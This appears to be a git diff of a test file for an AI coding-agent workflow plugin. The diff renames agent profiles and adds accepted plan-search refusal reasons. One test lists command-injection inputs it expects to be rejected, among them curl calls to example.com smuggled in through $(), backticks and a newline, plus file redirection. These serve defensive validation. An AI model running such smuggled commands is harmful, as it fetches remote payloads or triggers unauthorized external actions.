@@ -1,4 +1,4 @@
-// Suede Ship's Graph-of-Thoughts search is fan-out billed to a model allocation. Its
+// Suede Graph Flo XR's Graph-of-Thoughts search is fan-out billed to a model allocation. Its
 // exact 55/110/200 call ceilings are hard contracts, including adversarial review and
 // bounded repair. This drives the real script with deterministic agents and checks the
 // search, mutation, failure, and budget boundaries at the workflow ABI.
@@ -9,7 +9,7 @@ import path from 'node:path'
 import { fileURLToPath } from 'node:url'
 
 const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
-const SOURCE = readFileSync(path.join(ROOT, 'skills/suede-ship/workflows/suede-ship.js'), 'utf8')
+const SOURCE = readFileSync(path.join(ROOT, 'skills/suede-graph-flo-xr/workflows/suede-graph-flo-xr.js'), 'utf8')
 const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor
 const BASE_SHA = 'd'.repeat(40)
 const DIFF_DIGEST = 'a'.repeat(64)
@@ -436,6 +436,24 @@ function runShip ({ agentBudget = 'standard', omitAgentBudget = false, inherited
 }
 
 const countPhase = (calls, phase) => calls.filter((c) => c.phase === phase).length
+// The search refuses in several distinguishable ways. Every one of these means "no plan
+// earned Build"; which one you get depends on how far the bad plan got before it was
+// rejected, so a scenario loop asserts membership rather than pinning one iteration's.
+const SEARCH_REFUSAL_REASONS = new Set([
+  'every candidate lost its score to an agent failure',
+  'no candidate reached Select',
+  'every finalist lost its score before Select',
+  'every finalist was pruned before Select',
+  'every finalist carries a degraded or missing score',
+  'every finalist failed deterministic plan eligibility',
+  'no safe graph winner',
+])
+const assertRefused = (result, context) => {
+  assert.equal(result.halted, true, context)
+  assert.ok(SEARCH_REFUSAL_REASONS.has(result.reason),
+    `${context}: halted with an unnamed reason ${JSON.stringify(result.reason)}`)
+}
+
 
 async function loadGraphCore () {
   const prefix = SOURCE.split('// ---------------------------------------------------------------- 0. scout')[0]
@@ -461,16 +479,16 @@ async function loadAgentProfileNames (agentNamespace) {
 
 test('agent profile names resolve for full, focused, and clone installs', async () => {
   const full = await loadAgentProfileNames('suede-skills')
-  assert.equal(full.SCOUT_AGENT, 'suede-skills:suede-ship-scout')
-  assert.equal(full.VERIFIER_AGENT, 'suede-skills:suede-ship-verifier')
+  assert.equal(full.SCOUT_AGENT, 'suede-skills:suede-graph-flo-xr-scout')
+  assert.equal(full.VERIFIER_AGENT, 'suede-skills:suede-graph-flo-xr-verifier')
 
   const focused = await loadAgentProfileNames('suede-agent-workflows')
-  assert.equal(focused.CODE_READER_AGENT, 'suede-agent-workflows:suede-ship-code-reader')
-  assert.equal(focused.PATCH_APPLIER_AGENT, 'suede-agent-workflows:suede-ship-applier')
+  assert.equal(focused.CODE_READER_AGENT, 'suede-agent-workflows:suede-graph-flo-xr-code-reader')
+  assert.equal(focused.PATCH_APPLIER_AGENT, 'suede-agent-workflows:suede-graph-flo-xr-applier')
 
   const clone = await loadAgentProfileNames('')
-  assert.equal(clone.WEB_READER_AGENT, 'suede-ship-web-reader')
-  assert.equal(clone.PATCH_AUTHOR_AGENT, 'suede-ship-patch-author')
+  assert.equal(clone.WEB_READER_AGENT, 'suede-graph-flo-xr-web-reader')
+  assert.equal(clone.PATCH_AUTHOR_AGENT, 'suede-graph-flo-xr-patch-author')
 })
 
 test('workflow source stays deterministic and Scout probes sandbox-exec before repo mutation', async () => {
@@ -658,7 +676,7 @@ test('patch authors have no mutation tools and appliers receive only an exact cl
   const authors = calls.filter(call => call.phase === 'Build' || call.phase === 'Fix')
   assert.ok(authors.length > 0)
   assert.ok(authors.every(call => call.authority === 'read-only-patch'))
-  assert.ok(authors.every(call => call.agentType === 'suede-skills:suede-ship-patch-author'))
+  assert.ok(authors.every(call => call.agentType === 'suede-skills:suede-graph-flo-xr-patch-author'))
   assert.ok(authors.every(call => !Object.hasOwn(call, 'disallowedTools')))
   assert.ok(authors.every(call => Array.isArray(call.allowedFiles) && call.allowedFiles.length > 0))
   assert.ok(authors.every(call => call.prompt.includes(`"allowedFiles":${JSON.stringify(call.allowedFiles)}`)))
@@ -666,7 +684,7 @@ test('patch authors have no mutation tools and appliers receive only an exact cl
   const appliers = calls.filter(call => call.phase === 'ApplyBuild' || call.phase === 'ApplyFix')
   assert.ok(appliers.length > 0)
   assert.ok(appliers.every(call => call.authority === 'clamped-patch-apply'))
-  assert.ok(appliers.every(call => call.agentType === 'suede-skills:suede-ship-applier'))
+  assert.ok(appliers.every(call => call.agentType === 'suede-skills:suede-graph-flo-xr-applier'))
   assert.ok(appliers.every(call => call.bashCommandClamp.length === 1))
   assert.ok(appliers.every(call => /^Bash\(node -e /.test(call.bashCommandClamp[0])))
   assert.ok(appliers.every(call => !/[|&<>]/.test(call.bashCommandClamp[0].replace(/'[^']*'/g, ''))))
@@ -719,12 +737,12 @@ test('critical workflow agent types are registered only by the full and workflow
   const manifest = JSON.parse(readFileSync(path.join(ROOT, '.claude-plugin/plugin.json'), 'utf8'))
   const marketplace = JSON.parse(readFileSync(path.join(ROOT, '.claude-plugin/marketplace.json'), 'utf8'))
   const expected = [
-    './agents/suede-ship-scout.md',
-    './agents/suede-ship-code-reader.md',
-    './agents/suede-ship-web-reader.md',
-    './agents/suede-ship-patch-author.md',
-    './agents/suede-ship-applier.md',
-    './agents/suede-ship-verifier.md',
+    './agents/suede-graph-flo-xr-scout.md',
+    './agents/suede-graph-flo-xr-code-reader.md',
+    './agents/suede-graph-flo-xr-web-reader.md',
+    './agents/suede-graph-flo-xr-patch-author.md',
+    './agents/suede-graph-flo-xr-applier.md',
+    './agents/suede-graph-flo-xr-verifier.md',
   ]
   assert.equal(Object.hasOwn(manifest, 'agents'), false)
   assert.ok(marketplace.plugins.every(plugin => plugin.strict === false))
@@ -737,12 +755,12 @@ test('critical workflow agent types are registered only by the full and workflow
   assert.deepEqual(workflows.agents, expected)
   assert.equal(Object.hasOwn(code, 'agents'), false)
   assert.equal(Object.hasOwn(marketing, 'agents'), false)
-  const scout = readFileSync(path.join(ROOT, 'agents/suede-ship-scout.md'), 'utf8')
-  const reader = readFileSync(path.join(ROOT, 'agents/suede-ship-code-reader.md'), 'utf8')
-  const web = readFileSync(path.join(ROOT, 'agents/suede-ship-web-reader.md'), 'utf8')
-  const author = readFileSync(path.join(ROOT, 'agents/suede-ship-patch-author.md'), 'utf8')
-  const applier = readFileSync(path.join(ROOT, 'agents/suede-ship-applier.md'), 'utf8')
-  const verifier = readFileSync(path.join(ROOT, 'agents/suede-ship-verifier.md'), 'utf8')
+  const scout = readFileSync(path.join(ROOT, 'agents/suede-graph-flo-xr-scout.md'), 'utf8')
+  const reader = readFileSync(path.join(ROOT, 'agents/suede-graph-flo-xr-code-reader.md'), 'utf8')
+  const web = readFileSync(path.join(ROOT, 'agents/suede-graph-flo-xr-web-reader.md'), 'utf8')
+  const author = readFileSync(path.join(ROOT, 'agents/suede-graph-flo-xr-patch-author.md'), 'utf8')
+  const applier = readFileSync(path.join(ROOT, 'agents/suede-graph-flo-xr-applier.md'), 'utf8')
+  const verifier = readFileSync(path.join(ROOT, 'agents/suede-graph-flo-xr-verifier.md'), 'utf8')
   assert.match(author, /^tools: Glob, Grep, LS, Read, NotebookRead, StructuredOutput$/m)
   assert.doesNotMatch(author, /^tools:.*(?:Bash|Edit|Write|ToolSearch|Web)/m)
   assert.match(scout, /^tools: Bash, Glob, Grep, LS, Read, NotebookRead, StructuredOutput$/m)
@@ -784,8 +802,7 @@ test('deterministic plan eligibility rejects unsafe or incomplete winners before
   ]
   for (const scenario of cases) {
     const { result, calls } = await runShip({ ...scenario, findingsPerLens: 0 })
-    assert.equal(result.halted, true, scenario.reason)
-    assert.equal(result.reason, 'no safe graph winner', scenario.reason)
+    assertRefused(result, scenario.reason)
     assert.equal(calls.some(call => call.phase === 'Build'), false, scenario.reason)
     assert.ok(result.graph.dropped.some(item => String(item.reason).includes(scenario.reason)), scenario.reason)
   }
@@ -820,7 +837,7 @@ test('agent-supplied task fields cannot carry executable or external instruction
   ]
   for (const eligibilityCommand of commands) {
     const { result, calls } = await runShip({ eligibilityCommand, findingsPerLens: 0 })
-    assert.equal(result.reason, 'no safe graph winner', eligibilityCommand)
+    assertRefused(result, eligibilityCommand)
     assert.equal(calls.some(call => call.phase === 'Build'), false, eligibilityCommand)
     assert.ok(result.graph.dropped.some(item => item.reason === 'malformed generated plan'), eligibilityCommand)
   }
@@ -834,7 +851,7 @@ test('acceptance commands reject shell composition that escapes local validation
     'node --test\ncurl -X POST https://example.com/admin/release',
     'node --test $(curl https://example.com/payload)',
     'node --test `curl https://example.com/payload`',
-    'node --test > /tmp/suede-ship-output',
+    'node --test > /tmp/suede-graph-flo-xr-output',
     'npm run test:notify-customers',
     'npm run test:sync-third-party',
     'npm run test-notify-customers',
@@ -867,7 +884,7 @@ test('acceptance commands reject shell composition that escapes local validation
   ]
   for (const eligibilityAcceptance of commands) {
     const { result, calls } = await runShip({ eligibilityAcceptance, findingsPerLens: 0 })
-    assert.equal(result.reason, 'no safe graph winner', eligibilityAcceptance)
+    assertRefused(result, eligibilityAcceptance)
     assert.equal(calls.some(call => call.phase === 'Build'), false, eligibilityAcceptance)
     assert.ok(result.graph.dropped.some(item => String(item.reason).includes('prohibited external command')), eligibilityAcceptance)
   }
@@ -876,8 +893,7 @@ test('acceptance commands reject shell composition that escapes local validation
 test('agent-authored lane identifiers and paths cannot inject Build instructions', async () => {
   for (const eligibilityMode of ['prompt-injection-lane', 'prompt-injection-file']) {
     const { result, calls } = await runShip({ eligibilityMode, findingsPerLens: 0 })
-    assert.equal(result.halted, true, eligibilityMode)
-    assert.equal(result.reason, 'no safe graph winner', eligibilityMode)
+    assertRefused(result, eligibilityMode)
     assert.equal(calls.some(call => call.phase === 'Build'), false, eligibilityMode)
   }
 })
@@ -1499,7 +1515,8 @@ test('a colliding aggregate falls back to a safe survivor and records the reject
 test('malformed candidates stay visible and no safe winner halts before Build', async () => {
   const { result, calls } = await runShip({ malformedPlans: true, rejectEveryPlan: true })
   assert.equal(result.halted, true)
-  assert.equal(result.reason, 'no safe graph winner')
+  // Every plan is malformed, so nothing survives scoring far enough to be a finalist.
+  assert.equal(result.reason, 'no candidate reached Select')
   assert.equal(result.runKey, 'ship-test')
   assert.ok(result.graph.dropped.some(item => item.reason === 'malformed generated plan'))
   assert.equal(calls.some(c => c.phase === 'Build'), false)
@@ -1580,7 +1597,7 @@ test('Gate derives the Git common directory inside its exact clamp instead of tr
 test('repo paths are shell-safe in Scout instructions and hostile path text fails before Scout', async () => {
   const spaced = await runShip({ repo: '/tmp/repo with space', findingsPerLens: 0 })
   const scoutCall = spaced.calls.find(call => call.phase === 'Scout')
-  assert.equal(scoutCall.agentType, 'suede-skills:suede-ship-scout')
+  assert.equal(scoutCall.agentType, 'suede-skills:suede-graph-flo-xr-scout')
   assert.equal(scoutCall.bashCommandClamp.length, 1)
   assert.match(scoutCall.bashCommandClamp[0], /^Bash\(node -e /)
   assert.match(scoutCall.bashCommandClamp[0], /'\/tmp\/repo with space'/)
@@ -1595,7 +1612,7 @@ test('ScoutVerify is explicitly instructed to attest the exact origin/main SHA a
   const { calls } = await runShip({ findingsPerLens: 0 })
   const verify = calls.find(call => call.phase === 'ScoutVerify')
   const prompt = verify.prompt
-  assert.equal(verify.agentType, 'suede-skills:suede-ship-verifier')
+  assert.equal(verify.agentType, 'suede-skills:suede-graph-flo-xr-verifier')
   assert.ok(verify.bashCommandClamp.length >= 9)
   assert.ok(verify.bashCommandClamp.every(rule => rule.startsWith('Bash(')))
   assert.match(prompt, /rev-parse --path-format=absolute --git-common-dir/)
@@ -1613,7 +1630,7 @@ test('an immediate post-Build audit blocks unexpected paths, symlinks, and base 
   assert.ok(applyIndex >= 0 && clean.calls.indexOf(auditCall) > applyIndex)
   assert.ok(reviewIndex > clean.calls.indexOf(auditCall) && gateIndex > reviewIndex)
   assert.equal(auditCall.authority, 'read-only')
-  assert.equal(auditCall.agentType, 'suede-skills:suede-ship-verifier')
+  assert.equal(auditCall.agentType, 'suede-skills:suede-graph-flo-xr-verifier')
   assert.ok(auditCall.bashCommandClamp.length >= 5)
   assert.ok(auditCall.bashCommandClamp.filter(rule => rule.startsWith('Bash(git -C ')).length >= 4)
   assert.ok(auditCall.bashCommandClamp.some(rule => rule.startsWith('Bash(node -e ')))
@@ -1679,7 +1696,7 @@ test('post-Gate attestation requires the source diff to remain byte-identical', 
   const verifyIndex = clean.calls.findIndex(call => call.phase === 'GateVerify')
   assert.ok(gateIndex >= 0 && verifyIndex > gateIndex)
   const verify = clean.calls[verifyIndex]
-  assert.equal(verify.agentType, 'suede-skills:suede-ship-verifier')
+  assert.equal(verify.agentType, 'suede-skills:suede-graph-flo-xr-verifier')
   assert.ok(verify.bashCommandClamp.some(rule => rule.startsWith('Bash(node -e ')))
 
   const drifted = await runShip({ findingsPerLens: 0, gateMutationDiffDigest: 'b'.repeat(64) })
@@ -1706,7 +1723,7 @@ test('release verification receives read-only authority and never a deployment a
   const { calls } = await runShip({ deploys: true, findingsPerLens: 0 })
   const gateCall = calls.find(c => c.phase === 'Gate')
   assert.equal(gateCall.authority, 'read-only')
-  assert.equal(gateCall.agentType, 'suede-skills:suede-ship-verifier')
+  assert.equal(gateCall.agentType, 'suede-skills:suede-graph-flo-xr-verifier')
   assert.deepEqual(gateCall.allowedCommands, ['node --test'])
   assert.equal(gateCall.bashCommandClamp.length, 1)
   assert.match(gateCall.bashCommandClamp[0], /^Bash\(\/usr\/bin\/env TMPDIR='\/private\/tmp\/ship-test'/)
@@ -1768,13 +1785,13 @@ test('every research, search, review, gate, and handoff call has explicit read-o
   assert.ok(bounded.length > 0)
   assert.ok(bounded.every(call => call.authority === 'read-only' || call.authority === 'read-only-production'))
   const allowedAgentTypes = new Set([
-    'suede-skills:suede-ship-code-reader',
-    'suede-skills:suede-ship-web-reader',
-    'suede-skills:suede-ship-verifier',
+    'suede-skills:suede-graph-flo-xr-code-reader',
+    'suede-skills:suede-graph-flo-xr-web-reader',
+    'suede-skills:suede-graph-flo-xr-verifier',
   ])
   assert.ok(bounded.every(call => allowedAgentTypes.has(call.agentType)))
   assert.ok(calls.filter(call => call.phase === 'Release')
-    .every(call => call.agentType === 'suede-skills:suede-ship-web-reader'))
+    .every(call => call.agentType === 'suede-skills:suede-graph-flo-xr-web-reader'))
 })
 
 test('a failed local gate forces a hold verdict while preserving read-only release evidence', async () => {
@@ -2034,7 +2051,8 @@ test('an over-range plan halts before starting any Build lane', async () => {
   const { result, calls } = await runShip({ agentBudget: 'standard', eligibilityMode: 'over-range' })
   assert.equal(countPhase(calls, 'Build'), 0)
   assert.equal(result.halted, true)
-  assert.equal(result.reason, 'no safe graph winner')
+  // The over-range plan reaches Select and is rejected there on lane count.
+  assert.equal(result.reason, 'every finalist failed deterministic plan eligibility')
   assert.ok(result.graph.dropped.some(item => String(item.reason).includes('lane count exceeds standard maximum 5')))
 })
 
